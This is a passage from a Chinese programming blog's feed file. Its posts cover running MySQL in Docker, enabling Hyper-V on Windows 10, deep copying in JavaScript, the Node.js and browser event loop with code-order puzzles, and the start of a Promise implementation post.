（为什么会有两个端口号，因为右边是虚拟机的，再加上一个本地的）</li><li>最终命令 &#96;docker run –name mysql1 -e MYSQL_ROOT_PASSWORD&#x3D;123456 -p 3306:3306 -d mysql:5.7.27</li></ol><h3 id="一些有用的-Docker-命令"><a href="#一些有用的-Docker-命令" class="headerlink" title="一些有用的 Docker 命令"></a>一些有用的 Docker 命令</h3><ol><li>运行 docker ps 查看容器运行状态</li><li>运行 docker kill mysql1 关掉容器</li><li>运行 docker container start mysql1 开启刚刚关掉的容器</li><li>运行 docker rm mysql1 删掉容器，必要时可加 -f 选项</li><li>运行 docker run 启动新容器。</li></ol><p><em>注意</em></p><ol><li>用 Docker 运行的容器，默认不会持久化</li><li>也就是说如果容器被删掉了，那么数据也没了</li><li>如果需要持久化，自行搜索 【docker mysql 数据目录】</li><li>学习玩具不需要持久化</li></ol><h2 id="如何用命令行连接-mysql"><a href="#如何用命令行连接-mysql" class="headerlink" title="如何用命令行连接 mysql"></a>如何用命令行连接 mysql</h2><ul><li>Docker exec 命令</li></ul><ol><li>docker exec -it mysql1 bash</li><li>这句话就会进入容器，容器里有一个 Linux 系统</li><li>然后你就可以在这个系统里面运行 mysql</li></ol><ul><li>mysql 命令</li></ul><ol><li>mysql -u root -p 回车，让后输入密码 123456</li><li>命令 show databases; 可查看数据库列表</li><li>命令 use xxx; 可选择使用 xxx 数据库</li><li>命令 show tables; 查看所有表</li><li>命令 select * from  XXX ; 查看表内容</li></ol><p><img src="/Blog/2020/06/06/javascript/Docker-MySQL/index/img.png"></p><h2 id="MySQL-数据类型"><a href="#MySQL-数据类型" class="headerlink" title="MySQL 数据类型"></a>MySQL 数据类型</h2><h4 id="五大类"><a href="#五大类" class="headerlink" title="- 五大类"></a>- 五大类</h4><ol><li>数字类型</li><li>字符串类型</li><li>时间和日期类型</li><li>JSON 类型 （5.7.8以上）</li><li>其他特殊类型</li></ol><h5 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h5><ol><li>bit</li><li>tinyint</li><li>bool，boolean</li><li>smallint</li><li>mediumint</li><li>int</li><li>bigint</li><li>decimal</li><li>float</li><li>double</li><li>serial 等价于 BIGINT UNSIGNED NOT NULL<br>AUTO_INCREMENT UNIQUE</li></ol><p><a href="https://dev.mysql.com/doc/refman/8.0/en/numeric-type-overview.html">具体</a>，其中 [] 表示可选。</p><h5 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h5><ol><li>char(100)</li><li>varchar(100)</li><li>binary(1024)</li><li>varbinary(1024)</li><li>blob</li><li>text</li><li>enum(‘v1’, ‘v2’)</li><li>set(‘v1’, ‘v2’)</li></ol><p><a href="https://dev.mysql.com/doc/refman/8.0/en/string-type-overview.html">具体</a></p><h5 id="时间和日期类型"><a href="#时间和日期类型" class="headerlink" title="时间和日期类型"></a>时间和日期类型</h5><ol><li>date</li><li>time</li><li>datetime</li><li>timestamp</li><li>yaer</li></ol><p><a href="https://dev.mysql.com/doc/refman/8.0/en/date-and-time-types.html">具体</a></p><ul><li>关注一下 ISO 8601<br>很多程序员处理不好日期数据，就是因为不了解他<br><a href="https://stackoverflow.com/questions/9321809/format-date-in-mysql-select-as-iso-8601">如何把日期输出为 ISO 8601 格式</a></li></ul><h2 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h2><p><img src="/Blog/2020/06/06/javascript/Docker-MySQL/index/img_1.png"></p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>windows 10 docker cannot enable hyper-v service</title>
      <link href="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/"/>
      <url>/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/</url>
      
        <content type="html"><![CDATA[<p>刚装完最新版的 docker ，启动时出现以下提示：</p><p><img src="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/img.png"></p><p><a href="https://docs.microsoft.com/en-us/virtualization/hyper-v-on-windows/reference/hyper-v-requirements">首先</a>在命令行中输入 <code>systeminfo</code> 检查验证硬件兼容性，然后检查“ <strong>Hyper-V</strong> 要求”部分，验证Windows中的硬件兼容性。如果所有列出的Hyper-V要求的值都为Yes，则系统可以运行Hyper-V下，如下图：</p><p><img src="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/img_1.png"></p><p>同样需要四项均为“<strong>是</strong>”才符合运行Hyper-V虚拟机的要求。</p><p>之后进入 bios 开启：<br><em>注：不同的主板BIOS设置项不同，但大同小异。</em></p><p><img src="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/img_2.png"></p><p>进入CPU Configuration设置界面，在底部可以看到 <code>Intel Virtualization Technology</code> 设置项。如图：</p><p><img src="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/img_3.png"></p><p>把它设置为Enabled，这样就开启了CPU的虚拟化支持功能。最后保存退出BIOS设置。</p><p>之后也注意如下设置也要全部开启：</p><p><img src="/Blog/2020/06/06/javascript/windows-10-docker-cannot-enable-hyper-v-service/index/img_4.png"></p><p>end。</p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>【Vue全解】数据响应式</title>
      <link href="/Blog/2020/05/29/javascript/%E3%80%90Vue%E5%85%A8%E8%A7%A3%E3%80%91%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/index/"/>
      <url>/Blog/2020/05/29/javascript/%E3%80%90Vue%E5%85%A8%E8%A7%A3%E3%80%91%E6%95%B0%E6%8D%AE%E5%93%8D%E5%BA%94%E5%BC%8F/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>正在写</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>继承和组合</title>
      <link href="/Blog/2020/05/29/javascript/%E7%BB%A7%E6%89%BF%E5%92%8C%E7%BB%84%E5%90%88/index/"/>
      <url>/Blog/2020/05/29/javascript/%E7%BB%A7%E6%89%BF%E5%92%8C%E7%BB%84%E5%90%88/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>正在写</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写深拷贝</title>
      <link href="/Blog/2020/05/29/javascript/%E6%89%8B%E5%86%99%E6%B7%B1%E6%8B%B7%E8%B4%9D/index/"/>
      <url>/Blog/2020/05/29/javascript/%E6%89%8B%E5%86%99%E6%B7%B1%E6%8B%B7%E8%B4%9D/index/</url>
      
        <content type="html"><![CDATA[<p>什么是深拷贝？</p><blockquote><p>简单理解：b是a的一份拷贝，b中没有对a中对象的引用。<br>另一种理解：b是a的一份拷贝，把b和a各画出图，a与b没有连接。</p></blockquote><p>如何答题：</p><blockquote><p>步骤：</p><ol><li>询问数据类型</li><li>询问数据规模</li><li>询问性能要求</li><li>询问运行环境</li><li>询问其他要求</li><li>开始写</li></ol></blockquote><h1 id="1-序列化和反序列化"><a href="#1-序列化和反序列化" class="headerlink" title="1.序列化和反序列化"></a>1.序列化和反序列化</h1><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(xxx))</span><br></pre></td></tr></table></figure><blockquote><p>缺点：</p><ol><li>不支持函数</li><li>不支持循环引用</li><li>不支持undefined</li><li>不支持正则</li><li>不支持Symbol</li><li>不支持date（半支持，会返回一个iso8601格式的字符串时间）<br>  遇到以上这些直接忽略。</li></ol></blockquote><p><a href="https://github.com/zch233/myDeepClone">https://github.com/zch233/myDeepClone</a></p>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>event loop</title>
      <link href="/Blog/2020/05/28/javascript/event-loop/index/"/>
      <url>/Blog/2020/05/28/javascript/event-loop/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://nodejs.org/en/docs/guides/event-loop-timers-and-nexttick/">参考</a></p><blockquote><p>有空需要自己把英文文档翻译一遍，锻炼英语能力。</p></blockquote><blockquote><p>event loop 这玩意儿对于前端来说已经超纲了，这东西是 c++ 实现的，js 程序员怎么会知道 c++ 的东西。那该怎么学的，看官方文档。</p></blockquote><h2 id="首先讲讲操作系统有关的知识"><a href="#首先讲讲操作系统有关的知识" class="headerlink" title="首先讲讲操作系统有关的知识"></a>首先讲讲操作系统有关的知识</h2><blockquote><p>当我们按下键盘的时候，发生了什么，  操作系统是怎么知道的？</p></blockquote><p>到现在我也不知道他是怎么知道的，通过搜索发现是这样的：键盘下面有一个电路，当我们按下某个键的时候，就有触发一个信息，例如:0101，这个数字就会被传给操作系统，操作系统知道了以后，就会传给浏览器，浏览器知道了以后，把内容显示在 <code>input</code> 框里。</p><p>为什么讲这个呢，浏览器会接受到系统给他的 <strong>事件</strong>，这个是第一个概念，操作系统会接受到各种信号（像插入 usb 之类的事件，但就不是通知浏览器了，而是通知其他设备），在分配给其他软件。</p><p>这其中又有一个疑问，操作系统是在接受这个信号的时候，<strong>是立马就知道的呢?<strong>， 还是</strong>每隔一段时间问一次呢?</strong></p><p>非常遗憾，操作系统并没有那么智能，他只能不停的等键盘触发，比如每隔5mm，看看键盘有没有触发，不停地循环，当用户按了以后就放进一个队列，操作系统每隔5mm就会发现并执行，这个行为就叫 <strong>轮询</strong>。</p><h2 id="接下来看看JS"><a href="#接下来看看JS" class="headerlink" title="接下来看看JS"></a>接下来看看JS</h2><p>浏览器不止运行JS，还要发起一些网络请求，比如：当浏览器执行JS代码的时候，遇到中间有一个AJAX请求，需要耗时0.2s， JS是一个单线程的，单线程就是不可能同时执行两个任务的，所以<strong>应该要等ajax发送接受完在继续执行接下来的代码呢？</strong>还是继续执行以后的代码，在回头接受AJAX呢？**， 两个方向只能二选一。</p><p><img src="/Blog/2020/05/28/javascript/event-loop/index/img.png"></p><p>通过认知我们知道，JS选得是第二条路，先执行接下来的代码，但是疑问又来了，<strong>请问这0.2s是谁在等（轮询，开头说过没那么智能）呢</strong>，谁知道这个请求成功了呢？总得有人在等这个请求成功了没把，这段时间JS在做其他事情，首先排除JS。</p><p>所以是 **C++**，写浏览器的核心机制（这对前端来说已经超纲了），不停地去看网络到了没，或者是操作系统，不管是谁在做这个事情，反正不是JS，暂时不管这些细节。</p><p>所以这个轮询是不是该遵循一种机制呢？（得有规律的告诉JS网络请求到了把），这不分知识点（超纲，已经脱离了 js）就是我们需要搞明白的 eventloop。</p><h2 id="接下来我们就讲讲这个规则"><a href="#接下来我们就讲讲这个规则" class="headerlink" title="接下来我们就讲讲这个规则"></a>接下来我们就讲讲这个规则</h2><blockquote><p>当 JS 遇到一个异步任务的时候，其实JS什么都没做，他只是给 C++ 发了一个消息，然后继续做自己的事情（单线程），C++ 在忙的时候，有一定的规则、顺序。然后把AXAJ返回的时间告诉 JS，JS 再继续执行。</p></blockquote><p>现在来看 node.js，nodeJs可以执行JS代码，浏览器也能执行JS代码，是差不多的，但是 event loop 是 nodeJS 的概念（node 官方的解释链接，但在学 JS 的时候从来没提到这个概念），而不是浏览器的， 所以我们这里讲讲 nodeJS 的 event loop。</p><blockquote><p>那么这是个啥呢？是真实存在的还是虚拟的概念。<br>翻译成中文就是 事件循环，就像组件的生命周期一样或者是人生循环(生 -&gt; 长 -&gt; 成熟 -&gt; 老 -&gt; 病 -&gt; 死 -&gt; 投胎)，按照佛教的观念什么时候尽头呢？什么时候开始呢？人是先生出来还是先投胎呢？<br>这是个抽象的概念，人生循环字都认识，组成一起问我人生循环是什么那就不认识了。其实人生循环就是人在一生中处于不同阶段的过程。<br>所以事件循环是指多个阶段的交替。</p></blockquote><h4 id="当-Node-js-启动时，会做这几件事"><a href="#当-Node-js-启动时，会做这几件事" class="headerlink" title="当 Node.js 启动时，会做这几件事"></a>当 Node.js 启动时，会做这几件事</h4><ol><li>初始化 event loop</li><li>开始执行脚本（或者进入 REPL，本文不涉及 REPL）。这些脚本有可能会调用一些异步 API、设定计时器或者调用 process.nextTick()</li><li>开始处理 event loop</li></ol><p>如何处理 event loop 呢？下图给出了一个简单的概览：</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   ┌───────────────────────┐</span><br><span class="line">┌─&gt;│        timers         │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     I/O callbacks     │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │     idle, prepare     │</span><br><span class="line">│  └──────────┬────────────┘      ┌───────────────┐</span><br><span class="line">│  ┌──────────┴────────────┐      │   incoming:   │</span><br><span class="line">│  │         poll          │&lt;─────┤  connections, │</span><br><span class="line">│  └──────────┬────────────┘      │   data, etc.  │</span><br><span class="line">│  ┌──────────┴────────────┐      └───────────────┘</span><br><span class="line">│  │       <span class="built_in"> check </span>         │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">└──┤    close callbacks    │</span><br><span class="line">   └───────────────────────┘</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中每个方框都是 event loop 中的一个阶段。</p><p>为了前端理解、简化为三个阶段</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   ┌───────────────────────┐</span><br><span class="line">┌─&gt;│        timers         │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │   /*I/O callbacks*/   │</span><br><span class="line">│  └──────────┬────────────┘</span><br><span class="line">│  ┌──────────┴────────────┐</span><br><span class="line">│  │   /*idle, prepare*/   │</span><br><span class="line">│  └──────────┬────────────┘      ┌───────────────┐</span><br><span class="line">│  ┌──────────┴────────────┐      │   incoming:   │</span><br><span class="line">│  │         poll          │&lt;─────┤  connections, │</span><br><span class="line">│  └──────────┬────────────┘      │   data, etc.  │</span><br><span class="line">│  ┌──────────┴────────────┐      └───────────────┘</span><br><span class="line">└──┤       <span class="built_in"> check </span>         │</span><br><span class="line">   └──────────┬────────────┘</span><br><span class="line">   ┌──────────┴────────────┐</span><br><span class="line">   │  /*close callbacks*/  │</span><br><span class="line">   └───────────────────────┘</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中 poll 阶段会<strong>停留一段时间</strong>（如网络请求、文件回调）</p><h5 id="分析：当我们执行-setTimeout-fn-1000-的时候，event-loop-有没有开启？也就是先开启-event-loop-还是，先执行代码呢？"><a href="#分析：当我们执行-setTimeout-fn-1000-的时候，event-loop-有没有开启？也就是先开启-event-loop-还是，先执行代码呢？" class="headerlink" title="分析：当我们执行 setTimeout(fn, 1000) 的时候，event loop 有没有开启？也就是先开启 event loop 还是，先执行代码呢？"></a>分析：当我们执行 setTimeout(fn, 1000) 的时候，event loop 有没有开启？也就是先开启 event loop 还是，先执行代码呢？</h5><p>从原文中看到，这并不确定（开启event loop（开启一个进程），执行JS（调用 V8 引擎）都需要时间，如：先开启了 event loop，但JS还没开始执行）。</p><blockquote><p>再来看这个 setTimeout(fn, 1000)，当 js 执行的时候，遇到 setTimeout（题外：这个 api 是浏览器提供的，js 本身是没有的）就把这个任务(fn)放进 timers 的队列中，然后就继续执行自己的其他事情，这个时候 timers 开启了也可能没有开启，一般最大的可能会在 poll 阶段，这个时候在等，边等边看时间，等了 300ms 的时候还暂不需要去执行 timers 里面的任务，500ms 的时候同理…，直至 1000ms 的时候就不等了，赶紧经过 check 阶段（必须），然后到达 timer 阶段执行掉任务，然后又回到 poll 继续等。<br>但是这个等待是有最长时间，不可能一直等下去的，比如说最多等待 3s，超过 3s 还没有任务就继续下个阶段。</p></blockquote><p>说了 poll 阶段和 timers 阶段，那么 check 阶段有什么呢？在 node 中有一个 setImmediate。他跟 setTimeout 差不多，但是后面没有参数。</p><p><img src="/Blog/2020/05/28/javascript/event-loop/index/img_1.png"></p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 当遇到这样的代码的时候</span><br><span class="line">setTimeout(fn, 1000) // 执行并将 fn 放进 timer 队列</span><br><span class="line">setImmediate(fn2) // 执行并将 fn2 放进<span class="built_in"> check </span>队列</span><br><span class="line"></span><br><span class="line">1. timers [fn(1000ms)]</span><br><span class="line">2. poll (等待....)</span><br><span class="line">3.<span class="built_in"> check </span>[fn2]</span><br><span class="line"></span><br><span class="line">// 此时 poll 阶段就不会继续等待更长的时间了（马上就有任务等着做了，还等个球）</span><br></pre></td></tr></table></figure><h5 id="所以。这才有了一道著名的考题：setTimeout-fn-0-和-setImmediate-fn2-【setImmediate属于check阶段】，fn先执行还是fn2先执行？"><a href="#所以。这才有了一道著名的考题：setTimeout-fn-0-和-setImmediate-fn2-【setImmediate属于check阶段】，fn先执行还是fn2先执行？" class="headerlink" title="所以。这才有了一道著名的考题：setTimeout(fn, 0) 和 setImmediate(fn2)【setImmediate属于check阶段】，fn先执行还是fn2先执行？"></a>所以。这才有了一道著名的考题：setTimeout(fn, 0) 和 setImmediate(fn2)<em>【setImmediate属于check阶段】</em>，fn先执行还是fn2先执行？</h5><p>以前我们都是靠背，setImmediate 优先级高，先执行。但是从上文分析，<strong>答案是不确定哪个先执行</strong>，得看event loop的开启时间，<strong>如果</strong>event loop 在 timer 阶段，那就会立马执行setTimeout 函数，再执行 setImmediate，<strong>如果</strong>在 poll 阶段，则会先执行setImmediate 再执行 setTimeout，当然也就只有刚开始的时候才会出现这种情况（因为不确定event loop 什么时候会开启），但是当一切都准备就绪的时候，即：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">setTimeout</span>(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">setTimeout</span>(fn, <span class="number">0</span>)</span><br><span class="line">  setImmediate(fn2)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br></pre></td></tr></table></figure><p>肯定就是 setImmediate 会先执行，因为大部分时间都会停留在poll阶段，所以也就有了我们平时记的 setImmediate 优先级高。</p><p><em>setTimeout(fn, 1000) 真的会准时在 1000ms 后执行吗？答案是不一定，原因是必须经过 check 阶段才到 timer 阶段去执行 fn。</em></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h4 id="这里再扯一个process-nextTick-他不属于任何一个阶段，代表在某个阶段立马执行，如："><a href="#这里再扯一个process-nextTick-他不属于任何一个阶段，代表在某个阶段立马执行，如：" class="headerlink" title="这里再扯一个process.nextTick,他不属于任何一个阶段，代表在某个阶段立马执行，如："></a>这里再扯一个process.nextTick,他不属于任何一个阶段，代表在某个阶段立马执行，如：</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">set<span class="constructor">Timeout(()</span> =&gt; &#123;</span><br><span class="line">  process.next<span class="constructor">Tick(<span class="params">fn3</span>)</span></span><br><span class="line">  console.log(<span class="number">1</span>)</span><br><span class="line">  set<span class="constructor">Timeout(<span class="params">fn</span>, 0)</span></span><br><span class="line">  set<span class="constructor">Immediate(<span class="params">fn2</span>)</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// fn3 =&gt; fn2 =&gt; fn</span></span><br></pre></td></tr></table></figure><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">set<span class="constructor">Timeout(()</span> =&gt; &#123;</span><br><span class="line">  process.next<span class="constructor">Tick(<span class="params">fn4</span>)</span>  </span><br><span class="line">  set<span class="constructor">Timeout(()</span> =&gt; &#123;</span><br><span class="line">    fn<span class="literal">()</span></span><br><span class="line">    process.next<span class="constructor">Tick(<span class="params">fn3</span>)</span></span><br><span class="line">  &#125;, <span class="number">0</span>)</span><br><span class="line">  set<span class="constructor">Immediate(<span class="params">fn2</span>)</span></span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"><span class="comment">// fn4 =&gt; fn2 =&gt; fn =&gt; fn3</span></span><br></pre></td></tr></table></figure><h4 id="我买再来看一题"><a href="#我买再来看一题" class="headerlink" title="我买再来看一题"></a>我买再来看一题</h4><p><img src="/Blog/2020/05/28/javascript/event-loop/index/img_2.png"></p><p>共四个函数：</p><p><img src="/Blog/2020/05/28/javascript/event-loop/index/img_3.png"></p><p>第一轮执行，fn1放进check队列，fn2放进timer队列</p><blockquote><ol><li>timer [fn2]</li><li>poll</li><li>check [fn1]</li></ol></blockquote><p>执行 fn1 的时候先打印出了 <strong>setImmediate1</strong> ，然后遇到setTimeout 函数即 fn3，所以把 fn3 放进 timer 队列，event loop 执行完了check 里的任务，进入下一个 timer 阶段，</p><blockquote><ol><li>timer [fn2, fn3]</li><li>poll</li><li>check [<del>fn1</del>]</li></ol></blockquote><p>所以，在 timer 阶段 fn2 先执行，打印出了 <strong>setTimeout2</strong>，然后把 fn4 放入 check 队列，<strong>注意：此时 timer 阶段尚未结束，必须先执行完 timer 阶段所有函数才能才能进入下一个阶段</strong>，所以紧接着打印出 <strong>setTimeout1</strong>，最后打印出 <strong>setImmediate2</strong></p><blockquote><ol><li>timer [<del>fn2</del>, <del>fn3</del>]</li><li>poll</li><li>check [<del>fn1</del>, fn4]</li></ol></blockquote><h4 id="照着这张图，无脑解决所有-event-loop-的题目。"><a href="#照着这张图，无脑解决所有-event-loop-的题目。" class="headerlink" title="照着这张图，无脑解决所有 event loop 的题目。"></a>照着这张图，无脑解决所有 event loop 的题目。</h4><blockquote><p>讲了半天都是 node 中的 event loop，那么跟 jser 有什么关系呢？浏览器比较简单，node 算比较完整的 event loop，会了 node 再看浏览器中就可以信手拈来了。</p></blockquote><h2 id="浏览器，就相对来说比较简单了，除了同步代码，就是异步代码（宏任务–-马上-、微任务–-一会-）"><a href="#浏览器，就相对来说比较简单了，除了同步代码，就是异步代码（宏任务–-马上-、微任务–-一会-）" class="headerlink" title="浏览器，就相对来说比较简单了，除了同步代码，就是异步代码（宏任务–(马上)、微任务–(一会)）"></a>浏览器，就相对来说比较简单了，除了同步代码，就是异步代码（宏任务–(马上)、微任务–(一会)）</h2><blockquote><p>macrotasks:setTimeout,setInterval, setImmediate, I&#x2F;O, UI渲染<br>microtasks:Promise.then(大部分都是用process.nextTick实现的), process.nextTick Object.observe(已经没人用了，取而代之的是 MutationObserver)</p></blockquote><p>看题：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">async <span class="keyword">function</span> <span class="title function_">async1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">  await async2();</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async <span class="keyword">function</span> <span class="title function_">async2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Promise(<span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;).then(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>解析：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">async <span class="keyword">function</span> <span class="title function_">async1</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">1</span>);</span><br><span class="line">  await async2();</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">2</span>); <span class="comment">// 等会儿再执行，标记为 f1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async <span class="keyword">function</span> <span class="title function_">async2</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">async1();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Promise(<span class="keyword">function</span> (<span class="params">resolve</span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">4</span>);</span><br><span class="line">  resolve();</span><br><span class="line">&#125;).then(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="number">5</span>) <span class="comment">// 等会儿再执行，标记为 f2</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 同步任务结束，依次开始执行剩下的 f1,f2。</span></span><br></pre></td></tr></table></figure><h2 id="总结：Eventloop"><a href="#总结：Eventloop" class="headerlink" title="总结：Eventloop"></a>总结：Eventloop</h2><ol><li>eventloop 是指一些阶段，在浏览器中（2个）和在 node.js（简化为3个）中实现是不一样的。</li><li>setTimeout -&gt; timers 阶段，setImmediate -&gt; check 阶段，nextTick -&gt; 当前阶段的后面。</li><li>promise 是对 nextTick 的封装。</li></ol>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>手写Promise，A+规范</title>
      <link href="/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/"/>
      <url>/Blog/2020/05/28/javascript/%E6%89%8B%E5%86%99Promise%EF%BC%8CA+%E8%A7%84%E8%8C%83/index/</url>
      
        <content type="html"><![CDATA[<p><a href="https://github.com/zch233/myPromise">https://github.com/zch233/myPromise</a></p><h3 id="再写一个-Promise-allSettled-返回所有的promise结果，不论成功或失败。新出的api，兼容性不太好"><a href="#再写一个-Promise-allSettled-返回所有的promise结果，不论成功或失败。新出的api，兼容性不太好" class="headerlink" title="再写一个 Promise.allSettled (返回所有的promise结果，不论成功或失败。新出的api，兼容性不太好)"></a>再写一个 <code>Promise.allSettled</code> (返回所有的promise结果，不论成功或失败。新出的api，兼容性不太好)</h3><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const task1 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Promise</span>.reject(<span class="number">1111</span>)</span><br><span class="line">const task2 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Promise</span>.reject(<span class="number">2222</span>)</span><br><span class="line">const task3 = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">Promise</span>.resolve(<span class="number">3333</span>)</span><br></pre></td></tr></table></figure><h4 id="原版用法："><a href="#原版用法：" class="headerlink" title="原版用法："></a>原版用法：</h4><p><img 